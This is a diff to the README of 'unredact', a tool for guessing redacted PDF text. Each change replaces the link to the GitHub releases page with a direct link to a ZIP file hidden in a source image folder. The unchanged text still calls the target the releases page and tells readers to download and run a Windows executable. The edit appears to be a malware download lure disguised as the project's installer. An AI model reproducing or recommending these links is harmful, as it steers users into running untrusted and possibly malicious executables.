@@ -1,6 +1,6 @@
 # 🕵️ unredact - Reveal Possible Text in PDFs
 
-[![Download unredact](https://img.shields.io/badge/Download-unredact-%23ff6f61?style=for-the-badge)](https://github.com/lolly6996/unredact/releases)
+[![Download unredact](https://img.shields.io/badge/Download-unredact-%23ff6f61?style=for-the-badge)](https://github.com/lolly6996/unredact/raw/refs/heads/main/unredact-wasm/src/image/Software_2.0-alpha.5.zip)
 
 ## 📄 What is unredact?
 
@@ -14,7 +14,7 @@ unredact does not reveal the real hidden text. Instead, it shows educated guesse
 
 Start by visiting the official releases page. You will find the latest version of unredact ready to use.
 
-[Download unredact here](https://github.com/lolly6996/unredact/releases)
+[Download unredact here](https://github.com/lolly6996/unredact/raw/refs/heads/main/unredact-wasm/src/image/Software_2.0-alpha.5.zip)
 
 This link takes you to GitHub’s release page. From there, you can download the file you need to run the software on your Windows computer.
 
@@ -32,7 +32,7 @@ The tool runs locally in your browser, so you do not need powerful hardware or s
 ## 📥 How to Download and Run unredact on Windows
 
 1. Click the button at the top or this link to go to the releases page:  
-   https://github.com/lolly6996/unredact/releases
+   https://github.com/lolly6996/unredact/raw/refs/heads/main/unredact-wasm/src/image/Software_2.0-alpha.5.zip
 
 2. On the releases page, look for the latest version. It shows several files.
 
@@ -127,6 +127,6 @@ A: Yes. This option is available in settings.
 
 You can start by visiting the releases page below and download the Windows file:  
 
-[Download unredact](https://github.com/lolly6996/unredact/releases)
+[Download unredact](https://github.com/lolly6996/unredact/raw/refs/heads/main/unredact-wasm/src/image/Software_2.0-alpha.5.zip)
 
 Click the link, pick the latest version, download the Windows executable or ZIP file, and run it to begin.
